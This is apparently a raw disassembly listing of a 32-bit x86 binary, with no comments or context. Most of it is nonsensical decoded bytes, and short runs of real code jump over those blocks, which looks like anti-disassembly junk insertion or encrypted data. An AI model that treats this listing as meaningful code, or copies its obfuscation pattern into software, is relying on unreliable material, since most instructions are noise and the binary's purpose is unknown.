  40211c:	mov    ebx,0x1f94ff20
  402121:	sar    cl,1
  402123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402124:	popa   
  402125:	retf   
  402126:	inc    edi
  402127:	pop    edi
  402128:	cmp    BYTE PTR ds:0xb2cf803f,0x3b
  40212f:	test   DWORD PTR [eax+0x25],ebx
  402132:	xchg   ebp,eax
  402133:	xor    al,al
  402135:	fimul  DWORD PTR [esi-0x3c4a86bd]
  40213b:	jle    0x40215b
  40213d:	popf   
  40213e:	(bad)
  402144:	sub    DWORD PTR ss:[ebx],eax
  402147:	rcr    BYTE PTR [esi],1
  402149:	adc    al,0x28
  40214b:	cld    
  40214c:	jb     0x4020e4
  40214e:	je     0x4021a0
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	fild   WORD PTR [ecx+0x21e44f6]
  40216f:	jle    0x4021ef
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x402127
  402176:	inc    esp
  402177:	ins    DWORD PTR es:[edi],dx
  402178:	fld    DWORD PTR ds:0xc3eb458a
  40217e:	push   esp
  40217f:	fisub  DWORD PTR [eax+edx*4+0x41]
  402183:	add    al,cl
  402185:	(bad)  
  402187:	pop    edi
  402188:	xchg   esi,eax
  402189:	ja     0x402178
  40218b:	dec    esp
  40218c:	stc    
  40218d:	rcl    BYTE PTR [edx+0x4e],1
  402190:	imul   DWORD PTR [ecx+0x57]
  402193:	jae    0x402166
  402195:	or     edi,DWORD PTR [ecx+0x6efb1a55]
  40219b:	shl    BYTE PTR [ebp+0x43951b9c],cl
  4021a1:	cmp    bl,0x7f
  4021a4:	mov    al,0xd7
  4021a6:	jnp    0x40215f
  4021a8:	sub    DWORD PTR [ecx-0x1a],edx
  4021ab:	mov    ebx,0x837cb4b5
  4021b0:	mov    ds,WORD PTR [ecx+0x35]
  4021b3:	sbb    ebp,eax
  4021b5:	in     eax,dx
  4021b6:	push   0xffffffe5
  4021b8:	sbb    ah,dh
  4021ba:	adc    DWORD PTR [edx+0x48],eax
  4021bd:	sar    BYTE PTR [esi-0x3432c417],1
  4021c3:	fsubr  st(3),st
  4021c5:	ja     0x402223
  4021c7:	bound  ebx,QWORD PTR [esi+0x20]
  4021ca:	cmp    eax,0x6d76f434
  4021cf:	pop    DWORD PTR [esp+0x52]
  4021d3:	sbb    ch,BYTE PTR [eax]
  4021d5:	inc    esp
  4021d6:	les    edi,FWORD PTR [ebx-0x2f274b45]
  4021dc:	or     eax,0xc691f2c7
  4021e1:	loopne 0x4021c2
  4021e3:	outs   dx,DWORD PTR ds:[esi]
  4021e4:	pop    ebp
  4021e5:	cmp    ebx,DWORD PTR [ebx-0xd]
  4021e8:	clc    
  4021e9:	sar    DWORD PTR [eax],1
  4021eb:	(bad)  [ecx+0x62]
  4021ee:	jmp    0xed16:0x31196187
  4021f5:	cwde   
  4021f6:	popa   
  4021f7:	js     0x402265
  4021f9:	dec    ebp
  4021fa:	push   eax
  4021fb:	mov    cl,BYTE PTR [eax]
  4021fd:	call   0x53119500
  402202:	jg     0x4021fe
  402204:	pushf  
  402205:	pop    esi
  402206:	push   es
  402207:	sbb    al,dh
  402209:	inc    ecx
  40220a:	daa    
  40220b:	into   
  40220c:	icebp  
  40220d:	and    eax,0xa5c76820
  402212:	mov    edx,0x9f7b888c
  402217:	int    0x59
  402219:	jle    0x4021f6
  40221b:	rcl    BYTE PTR [eax+0x235dd98b],cl
  402221:	cdq    
  402222:	ss jp  0x402209
  402225:	xlat   BYTE PTR ds:[ebx]
  402226:	ret    
  402227:	xchg   ebx,eax
  402228:	aam    0x2b
  40222a:	(bad)  [edi+eax*8-0x5b]
  40222e:	rol    dl,1
  402230:	push   0xf777490e
  402235:	loop   0x4021db
  402237:	pusha  
  402238:	pop    ss
  402239:	(bad)
  40223c:	xchg   ebx,eax
  40223d:	outs   dx,BYTE PTR ds:[esi]
  40223e:	inc    ebp
  40223f:	gs xchg ebp,eax
  402241:	dec    edx
  402242:	push   ebx
  402243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402244:	mov    ch,0x6e
  402246:	shl    BYTE PTR [esi+0x7d238100],0xf0
  40224d:	cwde   
  40224e:	out    0xf9,al
  402250:	sub    ebx,DWORD PTR [ebx-0x26]
  402253:	inc    ecx
  402254:	adc    bh,BYTE PTR [bx+si+0x5f49]
  402259:	rcl    DWORD PTR [eax+0x1b770a2d],1
  40225f:	jecxz  0x40226b
  402261:	lea    ebp,[esi]
  402263:	out    0x2b,al
  402265:	add    BYTE PTR [ecx],dh
  402267:	iret   
  402268:	test   BYTE PTR [edi+0x788d0a1d],dh
  40226e:	xor    eax,0x6167cdb4
  402273:	dec    edi
  402274:	fisttp WORD PTR [esi+0x7b]
  402277:	jae    0x402231
  402279:	cld    
  40227a:	dec    edx
  40227b:	jns    0x40221d
  40227d:	inc    esi
  40227e:	leave  
  40227f:	mov    WORD PTR [ecx+eiz*1-0x78],?
  402283:	mov    edx,esp
  402285:	mov    WORD PTR [edi+0x61c5ff37],cs
  40228b:	mov    WORD PTR [ecx+0x132df02a],es
  402291:	shl    ebx,1
  402293:	xor    eax,ebx
  402295:	and    eax,0xd64b6f
  40229a:	int    0x7c
  40229c:	fnstenv [edx+0x46555673]
  4022a2:	jle    0x402271
  4022a4:	loopne 0x402284
  4022a6:	adc    ebx,DWORD PTR [ebx-0x3e3e1830]
  4022ac:	outs   dx,BYTE PTR ds:[esi]
  4022ad:	fld    TBYTE PTR [ecx-0x2d3380]
  4022b3:	loope  0x4022f3
  4022b5:	dec    BYTE PTR [edi+0x2d]
  4022b8:	or     eax,0x60f5782a
  4022bd:	shl    BYTE PTR [ebx],0x12
  4022c0:	cdq    
  4022c1:	cld    
  4022c2:	fdiv   DWORD PTR [ebx-0x106149bf]
  4022c8:	xchg   edi,eax
  4022c9:	dec    esi
  4022ca:	les    esp,FWORD PTR [edi]
  4022cc:	out    0xf9,al
  4022ce:	add    eax,0x69cd6f4f
  4022d3:	daa    
  4022d4:	push   esi
  4022d5:	dec    eax
  4022d6:	fwait
  4022d7:	or     ch,dh
  4022d9:	daa    
  4022da:	mov    gs,WORD PTR [edx+0x5b]
  4022dd:	jmp    0xe0d1c853
  4022e2:	les    edx,FWORD PTR [esp+esi*8-0x50]
  4022e6:	sbb    ah,BYTE PTR [ecx+0x5e4f65e3]
  4022ec:	adc    edx,DWORD PTR [ebx]
  4022ee:	fild   QWORD PTR [ebp*8+0x1aa60d9c]
  4022f5:	mov    BYTE PTR [eax+0x6c],0x76
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	icebp  
  402358:	cli    
  402359:	push   0x7e039aef
  40235e:	jle    0x40235a
  402360:	jg     0x4023e0
  402362:	jle    0x40234d
  402364:	sbb    esi,DWORD PTR [esi+esi*4+0x5c457fb9]
  40236b:	ins    BYTE PTR es:[edi],dx
  40236c:	inc    eax
  40236d:	sub    dh,BYTE PTR [eax]
  40236f:	cmc    
  402370:	jge    0x402371
  402372:	call   0xebb4:0x36d0e58c
  402379:	xlat   BYTE PTR ds:[ebx]
  40237a:	pushf  
  40237b:	push   ds
  40237c:	lock lahf 
  40237e:	pusha  
  40237f:	pop    ebp
  402380:	test   al,0x8b
  402382:	inc    ecx
  402383:	fwait
  402384:	ins    DWORD PTR es:[edi],dx
  402385:	inc    eax
  402386:	cmp    eax,0xf87499b2
  40238b:	out    dx,al
  40238c:	imul   DWORD PTR [edx-0x21]
  40238f:	call   0x52ef2113
  402394:	mov    bh,al
  402396:	push   cs
  402397:	inc    ecx
  402398:	xchg   esp,eax
  402399:	cmp    al,0xec
  40239b:	scas   al,BYTE PTR es:[edi]
  40239c:	mov    cl,0xb1
  40239e:	pop    eax
  40239f:	and    dh,BYTE PTR [edi]
  4023a1:	fstp   DWORD PTR [eax]
  4023a3:	adc    BYTE PTR [esp+ebp*1+0x6a],dl
  4023a7:	imul   esi,DWORD PTR [ecx+0x16e298d1],0xffffffeb
  4023ae:	xchg   BYTE PTR [ecx],bl
  4023b0:	mov    ebx,0xe4e16ca7
  4023b5:	push   0x6e2c9e16
  4023ba:	loop   0x402356
  4023bc:	test   BYTE PTR [ebx],ah
  4023be:	out    dx,al
  4023bf:	ficom  DWORD PTR [ecx+0x56]
  4023c2:	add    al,0x7f
  4023c4:	push   cs
  4023c5:	aas    
  4023c6:	sub    dl,bl
  4023c8:	or     DWORD PTR [ebp-0x48],ebp
  4023cb:	mov    bl,0xb0
  4023cd:	xchg   ebx,eax
  4023ce:	jle    0x402379
  4023d0:	push   edx
  4023d1:	push   esi
  4023d2:	xlat   BYTE PTR ds:[ebx]
  4023d3:	or     DWORD PTR [eax+esi*4],eax
  4023d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023d7:	mov    ds:0x6ef94d45,al
  4023dc:	or     al,0x75
  4023de:	xor    eax,ebp
  4023e0:	fidivr WORD PTR [edx-0x3a]
  4023e3:	mov    DWORD PTR [ecx+0x6b6293f2],ecx
  4023e9:	hlt    
  4023ea:	xor    edx,DWORD PTR fs:[ecx-0x59613bda]
  4023f1:	clc    
  4023f2:	popa   
  4023f3:	pop    ecx
  4023f4:	xor    ah,ch
  4023f6:	into   
  4023f7:	das    
  4023f8:	sub    DWORD PTR [edi],0xffffffb3
  4023fb:	int    0x17
  4023fd:	or     ebp,DWORD PTR [esi-0x1ba5ee03]
  402403:	add    eax,0xb446e4ab
  402408:	cwde   
  402409:	push   edi
  40240a:	dec    esi
  40240b:	fcomi  st,st(3)
  40240d:	cdq    
  40240e:	jle    0x4023aa
  402410:	xchg   esi,eax
  402411:	cwde   
  402412:	sar    DWORD PTR [eax+0x76e9ff63],cl
  402418:	mov    al,0x1a
  40241a:	int3   
  40241b:	xor    eax,0xf01c628a
  402420:	push   eax
  402421:	cwde   
  402422:	(bad)  
  402423:	push   0xffffffbe
  402425:	retf   
  402426:	lock imul ebp,DWORD PTR [eax+0x0],0xe6482418
  40242e:	push   cs
  40242f:	cmp    eax,0xa74bcec5
  402434:	pop    edi
  402435:	adc    BYTE PTR [esi+0x42],dh
  402438:	(bad)  
  40243b:	popa   
  40243c:	ins    DWORD PTR es:[edi],dx
  40243d:	push   ebp
  40243e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40243f:	and    esi,DWORD PTR [edi]
  402441:	leave  
  402442:	adc    al,0x1f
  402444:	add    edi,DWORD PTR [ebp+0x253a7a5b]
  40244a:	mov    ds:0xa371a666,eax
  40244f:	rcr    DWORD PTR [ecx+0xe],1
  402452:	xor    esp,eax
  402454:	ret    0x76ed
  402457:	sbb    DWORD PTR [ecx],eax
  402459:	loope  0x40246d
  40245b:	in     al,0x47
  40245d:	cmp    eax,edx
  40245f:	test   DWORD PTR [ebp+0x20],ecx
  402462:	popf   
  402463:	xchg   ebp,eax
  402464:	je     0x4024a2
  402466:	or     esi,DWORD PTR ss:[edx-0x40860804]
  40246d:	stc    
  40246e:	inc    eax
  40246f:	fnsave [eax-0x4af668a5]
  402475:	scas   eax,DWORD PTR es:[edi]
  402476:	jl     0x40242b
  402478:	xor    al,0x52
  40247a:	jg     0x402465
  40247c:	pop    edi
  40247d:	dec    eax
  40247e:	xchg   ebx,eax
  40247f:	mov    ebx,eax
  402481:	sub    al,0xe6
  402483:	sub    BYTE PTR [ebx+0x30],bh
  402486:	retf   
  402487:	cmp    ebx,esp
  402489:	add    eax,0x48cb5020
  40248e:	in     al,dx
  40248f:	or     ecx,ebp
  402491:	or     eax,0x38d241e3
  402496:	iret   
  402497:	daa    
  402498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402499:	fcmove st,st(1)
  40249b:	dec    edi
  40249c:	sbb    al,0xa3
  40249e:	mov    eax,ds:0xff417158
  4024a3:	sbb    esi,DWORD PTR [eax]
  4024a5:	cmp    edi,DWORD PTR [edi-0x68]
  4024a8:	pop    es
  4024a9:	stc    
  4024aa:	popa   
  4024ab:	ins    DWORD PTR es:[edi],dx
  4024ac:	jae    0x40243a
  4024ae:	inc    esp
  4024af:	push   cs
  4024b0:	cld    
  4024b1:	ds jae 0x402527
  4024b4:	inc    DWORD PTR [esi+0x52]
  4024b7:	pop    es
  4024b8:	sbb    dl,BYTE PTR [esi+eiz*1]
  4024bb:	push   eax
  4024bc:	test   BYTE PTR [ecx+0x71c14062],dl
  4024c2:	jno    0x402472
  4024c4:	iret   
  4024c5:	xchg   ecx,eax
  4024c6:	adc    al,0x6f
  4024c8:	sbb    dh,al
  4024ca:	repz ror BYTE PTR [edx+0x62],0xc
  4024cf:	push   eax
  4024d0:	add    al,ah
  4024d2:	pop    esi
  4024d3:	cmp    BYTE PTR [edi+0x7b897b38],0x8d
  4024da:	(bad)  
  4024db:	mov    esp,0xa2343e1f
  4024e0:	xchg   ebp,eax
  4024e1:	fbstp  TBYTE PTR [esi]
  4024e3:	push   eax
  4024e4:	mov    al,0x1f
  4024e6:	jg     0x402473
  4024e8:	inc    ebp
  4024e9:	lock mov DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	cwde   
  40250e:	jb     0x4024b9
  402510:	shl    BYTE PTR [esi],cl
  402512:	add    DWORD PTR [esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x402523
  40251a:	inc    esp
  40251b:	add    al,BYTE PTR [eax+0x74]
  40251e:	popa   
  40251f:	std    
  402520:	dec    eax
  402521:	loope  0x402585
  402523:	clc    
  402524:	in     eax,dx
  402525:	sbb    ah,dl
  402527:	cld    
  402528:	std    
  402529:	inc    esi
  40252a:	and    BYTE PTR [ebp-0x37],al
  40252d:	jbe    0x4024bf
  40252f:	or     eax,0x52e99ba3
  402534:	pop    eax
  402535:	push   edx
  402536:	pop    ds
  402537:	stos   BYTE PTR es:[edi],al
  402538:	dec    ecx
  402539:	pop    edi
  40253a:	adc    BYTE PTR [ecx],dl
  40253c:	popa   
  40253d:	int    0x62
  40253f:	sbb    DWORD PTR [edi],0xffffff96
  402542:	outs   dx,BYTE PTR ds:[esi]
  402543:	or     DWORD PTR [edi+esi*2+0x551d979],ebx
  40254a:	dec    BYTE PTR [ecx]
  40254c:	mov    dh,BYTE PTR [eax]
  40254e:	xchg   ecx,eax
  40254f:	cmp    eax,0xc2b54ad6
  402554:	add    eax,0x8b7928b7
  402559:	sub    BYTE PTR [edi-0x7bb72c0c],cl
  40255f:	sub    DWORD PTR gs:[edx-0x6618b6fe],eax
  402566:	cmp    ah,BYTE PTR [eax+0x70]
  402569:	push   esp
  40256a:	aam    0x8a
  40256c:	lods   al,BYTE PTR ds:[esi]
  40256d:	push   edx
  40256e:	cmp    al,0xa4
  402570:	(bad)  
  402571:	into   
  402572:	and    al,0xe
  402574:	or     BYTE PTR [esi],bh
  402576:	(bad)  
  402577:	(bad)  
  402578:	jp     0x402552
  40257a:	call   0x47a934f6
  40257f:	cmp    al,0x4a
  402581:	ins    BYTE PTR es:[edi],dx
  402582:	arpl   ax,sp
  402584:	popa   
  402585:	xor    BYTE PTR ds:0xb9ba7d2c,dh
  40258b:	shr    BYTE PTR [edi],cl
  40258d:	inc    edi
  40258e:	in     al,0x16
  402590:	jb     0x402571
  402592:	sub    ah,al
  402594:	into   
  402595:	xchg   esi,eax
  402596:	add    DWORD PTR [eax-0x42292b8c],ebx
  40259c:	fsubrp st(4),st
  40259e:	inc    esp
  40259f:	mov    al,ds:0xa51b1cd5
  4025a4:	and    dl,BYTE PTR [edi]
  4025a6:	xchg   DWORD PTR [ebx-0x583489d7],esp
  4025ac:	inc    esp
  4025ad:	arpl   WORD PTR [ebp-0x4ae8235c],cx
  4025b3:	shl    bh,cl
  4025b5:	call   0xe546fbad
  4025ba:	jl     0x402634
  4025bc:	gs adc al,0xa
  4025bf:	push   esp
  4025c0:	std    
  4025c1:	cmp    ah,ah
  4025c3:	or     BYTE PTR [eax+0x6b],bh
  4025c6:	imul   ebx,DWORD PTR [edi+0x2b088467],0x52
  4025cd:	hlt    
  4025ce:	adc    DWORD PTR [ebp+0x7e],0xffffff96
  4025d2:	inc    esp
  4025d3:	retf   0x847b
  4025d6:	mov    ds:0x2a7d78c0,eax
  4025db:	pushf  
  4025dc:	or     al,0x8e
  4025de:	jge    0x4025d4
  4025e0:	data16 ins BYTE PTR es:[edi],dx
  4025e2:	test   dl,dh
  4025e4:	pushf  
  4025e5:	mov    ds:0x2e11a61f,eax
  4025ea:	inc    esp
  4025eb:	js     0x402581
  4025ed:	out    0x56,eax
  4025ef:	inc    eax
  4025f0:	sbb    al,0xe0
  4025f2:	add    BYTE PTR [ebp+0x60],dh
  4025f5:	out    dx,al
  4025f6:	lds    eax,FWORD PTR [ebx]
  4025f8:	inc    eax
  4025f9:	gs hlt 
  4025fb:	push   edi
  4025fc:	push   edi
  4025fd:	sbb    al,0x4c
  4025ff:	mov    cl,BYTE PTR [eax]
  402601:	call   DWORD PTR [edx]
  402603:	xchg   BYTE PTR [edx-0x55],dh
  402606:	stos   DWORD PTR es:[edi],eax
  402607:	jo     0x4025ad
  402609:	jge    0x40259f
  40260b:	mov    esi,0x75ad3ef7
  402610:	push   ds
  402611:	xchg   edi,eax
  402612:	mov    cl,BYTE PTR [edx]
  402614:	clc    
  402615:	push   edi
  402616:	sbb    esi,DWORD PTR [eax]
  402618:	addr16 out 0xb7,eax
  40261b:	xchg   DWORD PTR [ebp+0x6c712423],edx
  402621:	sbb    al,0x49
  402623:	cmp    bl,dh
  402625:	pop    edi
  402626:	gs dec esp
  402628:	pop    ss
  402629:	shl    BYTE PTR [eax+eax*1],cl
  40262c:	nop
  40262d:	(bad)  
  40262e:	in     eax,dx
  40262f:	mov    al,ds:0x8fc99e16
  402634:	mov    WORD PTR [ebx-0x6],es
  402637:	inc    ebp
  402638:	nop
  402639:	sbb    edx,ebx
  40263b:	pop    edx
  40263c:	sub    esi,DWORD PTR [eax-0x31528fc1]
  402642:	push   ebx
  402643:	mov    bh,0x9f
  402645:	push   cs
  402646:	add    eax,eax
  402648:	adc    al,0x40
  40264a:	mov    DWORD PTR [ebp-0x5c15d71a],edi
  402650:	inc    ebx
  402651:	sub    al,0x50
  402653:	xlat   BYTE PTR ds:[ebx]
  402654:	or     edx,DWORD PTR [ecx+0x729b27c6]
  40265a:	pop    ebx
  40265b:	loope  0x402601
  40265d:	test   BYTE PTR fs:[ebp+eax*4+0x6cb5f27d],cl
  402665:	xchg   edi,eax
  402666:	imul   ebx,DWORD PTR [ecx],0xd64699a3
  40266c:	out    dx,eax
  40266d:	into   
  40266e:	out    0x5b,al
  402670:	sub    al,BYTE PTR [ebx+0x23e7ac99]
  402676:	cmp    DWORD PTR [edx+0x60],ecx
  402679:	or     eax,0xa3a3c475
  40267e:	mov    al,0x2
  402680:	loopne 0x402618
  402682:	add    ch,BYTE PTR [esi+edi*2+0x38]
  402686:	call   FWORD PTR ds:[edi]
  402689:	mov    ebp,0xce7ef63b
  40268e:	scas   al,BYTE PTR es:[edi]
  40268f:	out    dx,al
  402690:	fnstcw WORD PTR [eax+esi*4-0x23]
  402694:	aam    0x53
  402696:	ror    edx,0x49
  402699:	push   eax
  40269a:	out    0x8a,al
  40269c:	inc    esi
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	jl     0x4026eb
  4026d4:	mov    bh,0xa1
  4026d6:	mov    ds:0xfa7e7e0e,al
  4026db:	jg     0x40275b
  4026dd:	jle    0x402698
  4026df:	push   esi
  4026e0:	adc    eax,0xfffe8231
  4026e5:	call   0xcf413ab4
  4026ea:	xor    al,0x6
  4026ec:	mov    edx,0xac97da45
  4026f1:	dec    esp
  4026f2:	aas    
  4026f3:	jp     0x402729
  4026f5:	inc    eax
  4026f6:	jne    0x4026c6
  4026f8:	jp     0x4026b7
  4026fa:	and    eax,0xf04af73e
  4026ff:	sub    al,0xc1
  402701:	fisttp WORD PTR [edi+esi*4-0x2aef9cfe]
  402708:	pusha  
  402709:	inc    esp
  40270a:	js     0x402727
  40270c:	mov    edi,0x1e949b0
  402711:	mov    edx,0x9e721837
  402716:	jb     0x402769
  402718:	sbb    eax,esp
  40271a:	or     al,0xd8
  40271c:	fld    QWORD PTR [eax-0x3ca23e22]
  402722:	xchg   ecx,eax
  402723:	cmp    DWORD PTR [edi+0x5b],0x208e125
  40272a:	aam    0xc8
  40272c:	cmp    DWORD PTR [edi+ecx*4-0x3cce112e],esi
  402733:	add    ecx,ebp
  402735:	adc    eax,0x4b987834
  40273a:	xor    eax,0x7c919ef
  40273f:	out    0x2,eax
  402741:	mov    bl,0xe6
  402743:	and    eax,0x461973be
  402748:	clc    
  402749:	cmp    cl,BYTE PTR [ebx]
  40274b:	out    dx,al
  40274c:	push   edx
  40274d:	pop    esp
  40274e:	pop    ebx
  40274f:	inc    esp
  402750:	mov    ebp,0x57fd10ab
  402755:	dec    esi
  402756:	arpl   WORD PTR [eax+0x72],di
  402759:	pop    ebp
  40275a:	cs and al,0x21
  40275d:	and    eax,0x80be5562
  402762:	aad    0xc1
  402764:	sbb    BYTE PTR [edx],bh
  402766:	push   eax
  402767:	mov    dh,BYTE PTR [edi-0x6]
  40276a:	lods   al,BYTE PTR ds:[esi]
  40276b:	xor    DWORD PTR [edi+0x9a95371],0xd7d261f4
  402775:	xchg   esi,eax
  402776:	sbb    eax,DWORD PTR [ecx+ebx*8+0x2d295011]
  40277d:	int3   
  40277e:	stos   WORD PTR es:[edi],ax
  402780:	xor    eax,DWORD PTR [ecx+0x2e69bafd]
  402786:	push   0xa0b0f3ef
  40278b:	add    dl,BYTE PTR [edx-0x32ffef93]
  402791:	xlat   BYTE PTR ds:[ebx]
  402792:	ror    BYTE PTR [edi],cl
  402794:	les    esp,FWORD PTR [edi+0x124941b0]
  40279a:	push   ss
  40279b:	loope  0x4027f4
  40279d:	mov    ch,0xe5
  40279f:	xchg   ecx,eax
  4027a0:	pop    ecx
  4027a1:	in     eax,0xf3
  4027a3:	and    DWORD PTR [esi],edx
  4027a5:	pop    ss
  4027a6:	xchg   edi,eax
  4027a7:	and    BYTE PTR [ebp+0x514cadb4],0x95
  4027ae:	add    eax,0x32679168
  4027b3:	jne    0x4027fa
  4027b5:	xlat   BYTE PTR ds:[ebx]
  4027b6:	pop    ecx
  4027b7:	call   0xca9a0a4e
  4027bc:	popf   
  4027bd:	inc    ecx
  4027be:	mov    dl,0x63
  4027c0:	mov    dl,0xde
  4027c2:	fild   WORD PTR [ecx+0xad2f598]
  4027c8:	dec    esp
  4027ca:	rcl    DWORD PTR [edx+0x3b017389],1
  4027d0:	lods   al,BYTE PTR ds:[esi]
  4027d1:	pop    edi
  4027d2:	jb     0x402778
  4027d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027d5:	push   eax
  4027d6:	wrmsr  
  4027d8:	or     edx,DWORD PTR [eax+0x72]
  4027db:	aad    0xed
  4027dd:	push   edi
  4027de:	jbe    0x402790
  4027e0:	pop    ss
  4027e1:	or     BYTE PTR [ebp-0x7352f136],dh
  4027e7:	sub    BYTE PTR [ebx+0x57],0xf3
  4027eb:	ja     0x40284a
  4027ed:	jbe    0x402805
  4027ef:	iret   
  4027f0:	jno    0x4027d5
  4027f2:	mov    al,0xdd
  4027f4:	lds    esi,FWORD PTR [edi+0x1a]
  4027f7:	(bad)  
  4027f8:	into   
  4027f9:	neg    DWORD PTR [ebp+0x2cf27108]
  4027ff:	jg     0x40281e
  402801:	cs addr16 inc ecx
  402804:	test   eax,0xc554be0e
  402809:	push   ebx
  40280a:	cmp    eax,0xf2089d1e
  40280f:	dec    edx
  402810:	lods   al,BYTE PTR ds:[esi]
  402811:	pop    eax
  402812:	lahf   
  402813:	push   ebp
  402814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402815:	shl    esi,1
  402817:	fstp   QWORD PTR [eax+eax*1]
  40281a:	push   esp
  40281b:	pop    ebx
  40281c:	mov    dl,0xa0
  40281e:	mov    esi,0xe47c3a64
  402823:	leave  
  402824:	lahf   
  402825:	sub    eax,0xb9e538e3
  40282a:	or     DWORD PTR [esi-0x4dd8a461],0xffffffa0
  402831:	xchg   edi,eax
  402832:	jno    0x4027e6
  402834:	mov    esp,0x8903a4e9
  402839:	test   eax,0xc0b3c38c
  40283e:	fdiv   st,st(1)
  402840:	or     DWORD PTR [esi],ecx
  402842:	xor    eax,0x3296dd26
  402847:	jnp    0x402852
  402849:	daa    
  40284a:	mov    edi,ebp
  40284c:	out    0x84,al
  40284e:	rcl    BYTE PTR [esi-0x6a],1
  402851:	aaa    
  402852:	jae    0x402896
  402854:	ret    0x5623
  402857:	sbb    DWORD PTR [esp+edx*4],0xffffff9b
  40285b:	push   esi
  40285d:	xchg   esi,eax
  40285e:	sti    
  40285f:	xlat   BYTE PTR ds:[ebx]
  402860:	dec    eax
  402861:	lds    ecx,FWORD PTR [ebx+0x4d8bd045]
  402867:	clc    
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	outs   dx,DWORD PTR ds:[esi]
  402884:	jg     0x402896
  402886:	jmp    0x4028b6
  402888:	or     al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402894
  402890:	lea    esp,[edi+0x7a32b7da]
  402896:	dec    ecx
  402897:	push   0x4e9259d1
  40289c:	xor    ah,BYTE PTR [eax-0x3447cbf9]
  4028a2:	cdq    
  4028a3:	out    0x91,al
  4028a5:	int3   
  4028a6:	mov    cl,0xd4
  4028a8:	in     al,0xd1
  4028aa:	lock arpl WORD PTR [ebx-0x57],bp
  4028ae:	mov    bh,0xf8
  4028b0:	fwait
  4028b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028b2:	aas    
  4028b3:	add    ah,BYTE PTR [edx+0x14]
  4028b6:	scas   eax,DWORD PTR es:[edi]
  4028b7:	es je  0x4028c2
  4028ba:	pop    ss
  4028bb:	mov    dl,0x8c
  4028bd:	sbb    DWORD PTR [eax+eiz*1+0x28288587],ebx
  4028c4:	xchg   edx,eax
  4028c5:	repz jo 0x402870
  4028c8:	sar    BYTE PTR [eax-0x24],0x77
  4028cc:	stc    
  4028cd:	out    0x4,eax
  4028cf:	lea    ebx,[ecx-0x7a]
  4028d2:	adc    bh,BYTE PTR [ebx]
  4028d4:	pop    edx
  4028d5:	jmp    0x138f:0xb9f0b388
  4028dc:	and    eax,0x4a2aaa4c
  4028e1:	pop    es
  4028e2:	call   0x8c7e:0x18dc2657
  4028e9:	rcl    ebx,1
  4028eb:	lock mov dl,0xc1
  4028ee:	mov    ebp,0xfadbe030
  4028f3:	mov    bh,0x9e
  4028f5:	mov    dh,0x16
  4028f7:	jnp    0x4028ce
  4028f9:	je     0x40296c
